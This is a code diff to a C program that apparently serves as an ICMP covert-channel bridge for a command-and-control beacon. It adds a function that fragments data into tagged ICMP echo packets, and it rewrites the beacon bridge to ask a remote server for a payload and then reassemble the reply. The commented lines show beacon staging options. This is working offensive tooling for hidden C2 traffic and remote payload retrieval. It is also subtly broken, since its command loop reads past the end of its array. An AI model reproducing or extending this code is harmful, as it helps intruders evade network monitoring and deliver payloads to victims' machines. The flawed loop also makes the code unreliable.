@@ -78,6 +78,7 @@ ex:
 // Prototypes
 int  send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num);
 char* recv_icmp_fragments(SOCKET s, uint32_t *out_len);
+void send_icmp_fragments(SOCKET s, struct sockaddr_in *dest, const char *payload, int payload_len);
 char* recv_icmp(SOCKET s, uint32_t *out_len);
 DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max);
 void write_frame(HANDLE my_handle, char * buffer, DWORD length);
@@ -336,6 +337,43 @@ char* recv_icmp_fragments(SOCKET s, uint32_t *out_len) {
     return NULL;
 }
 
+void send_icmp_fragments(SOCKET s, struct sockaddr_in *dest, const char *payload, int payload_len) {
+    // 1) Send seq=0: TAG + 4-byte big-endian length
+    uint32_t netlen = htonl((uint32_t)payload_len);
+    char buf0[TAG_SIZE + 4];
+    memcpy(buf0, ICMP_TAG, TAG_SIZE);
+    memcpy(buf0 + TAG_SIZE, &netlen, sizeof(netlen));
+    send_icmp(s, dest, buf0, TAG_SIZE + sizeof(netlen), 0);
+
+    Sleep(50);  // small pause before sending chunks
+
+    // 2) Send payload in chunks: each chunk = TAG + up to (ICMP_PAYLOAD_SIZE - TAG_SIZE) bytes
+    int max_data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE;
+    int total_chunks = (payload_len + max_data_per_chunk - 1) / max_data_per_chunk;
+    int offset = 0;
+    USHORT seq = 1;
+
+    while (offset < payload_len) {
+        int chunk_len = payload_len - offset;
+        if (chunk_len > max_data_per_chunk) {
+            chunk_len = max_data_per_chunk;
+        }
+
+        // Print progress for this chunk
+        printf("[+] Sending chunk %d/%d\n", seq, total_chunks);
+
+        char chunk_buf[ICMP_PAYLOAD_SIZE] = { 0 };
+        memcpy(chunk_buf, ICMP_TAG, TAG_SIZE);
+        memcpy(chunk_buf + TAG_SIZE, payload + offset, chunk_len);
+
+        int chunk_payload_len = TAG_SIZE + chunk_len;
+        send_icmp(s, dest, chunk_buf, chunk_payload_len, seq);
+
+        offset += chunk_len;
+        seq++;
+        Sleep(50);
+    }
+}
 // Modified recv_icmp to return both a data buffer and its length.
 // Caller must pass a pointer to a uint32_t to receive the length.
 char* recv_icmp(SOCKET s, uint32_t *out_len) {
@@ -425,19 +463,62 @@ int bridge_to_beacon() {
     ///////////////////////////////////////////////////////////////////////
     //// ASK for payload, by includin PAYLOAD in data
     ///////////////////////////////////////////////////////////////////////
-    char size_buf[ICMP_PAYLOAD_SIZE] = { 0 }; //buffer for copying PAYLOAD into
-    const char marker[] = "PAYLOAD";
-    memcpy(size_buf, ICMP_TAG, TAG_SIZE);
-    memcpy(size_buf + TAG_SIZE, marker, sizeof(marker) - 1);
-    // sizeof(marker)-1 == 7, so total bytes = 4 + 7 = 11
-    int size_payload_len = TAG_SIZE + (sizeof(marker) - 1);
+    // self.ts_send_frame(b"arch=x86")
+    // self.ts_send_frame(b"pipename=foobar")
+    // self.ts_send_frame(b"block=100")
+    // self.ts_send_frame(b"go")
 
-    // Send seq=0 Echo Request
-    if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
-        printf("[-] Failed to send seq=0 packet\n");
-        closesocket(s);
-        return 0;
-    }
+    
+    // char size_buf[ICMP_PAYLOAD_SIZE] = { 0 }; //buffer for copying PAYLOAD into
+    // const char marker[] = "PAYLOAD";
+    // memcpy(size_buf, ICMP_TAG, TAG_SIZE);
+    // memcpy(size_buf + TAG_SIZE, marker, sizeof(marker) - 1);
+    // // sizeof(marker)-1 == 7, so total bytes = 4 + 7 = 11
+    // int size_payload_len = TAG_SIZE + (sizeof(marker) - 1);
+
+    // // Send seq=0 Echo Request
+    // if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
+    //     printf("[-] Failed to send seq=0 packet\n");
+    //     closesocket(s);
+    //     return 0;
+    // }
+
+    const char *ts_cmds[] = {
+        "I WANT A PAYLOAD"
+    };
+
+    const int num_cmds = sizeof(ts_cmds) / sizeof(ts_cmds[0]);
+
+    for (int i = 0; i < num_cmds + 1; i++) {
+            const char *cmd = ts_cmds[i];
+            int total_len = (int)strlen(cmd);
+
+            send_icmp_fragments(s, &dest, cmd, total_len);
+            Sleep(1000);
+        }
+
+
+    //     const char *cmd = ts_cmds[i];
+    //     int cmd_len = (int)strlen(cmd);
+
+    //     // Build ICMP payload: [TAG][command string]
+    //     char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
+    //     memcpy(size_buf, ICMP_TAG, TAG_SIZE);
+    //     memcpy(size_buf + TAG_SIZE, cmd, cmd_len);
+
+    //     int size_payload_len = TAG_SIZE + cmd_len;
+    //     printf("[+] Sending seq=0 with command: %s\n", cmd);
+
+    //     // Send seq=0 Echo Request
+    //     if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
+    //         printf("[-] Failed to send seq=0 packet for command: %s\n", cmd);
+    //         closesocket(s);
+    //         return 0;
+    //     }
+
+    //     // Optional: small delay between commands
+    //     Sleep(100);
+    // }
 
     ///////////////////////////////////////////////////////////////////////
     ////  Wait for and reassemble all fragments (Echo Replies)
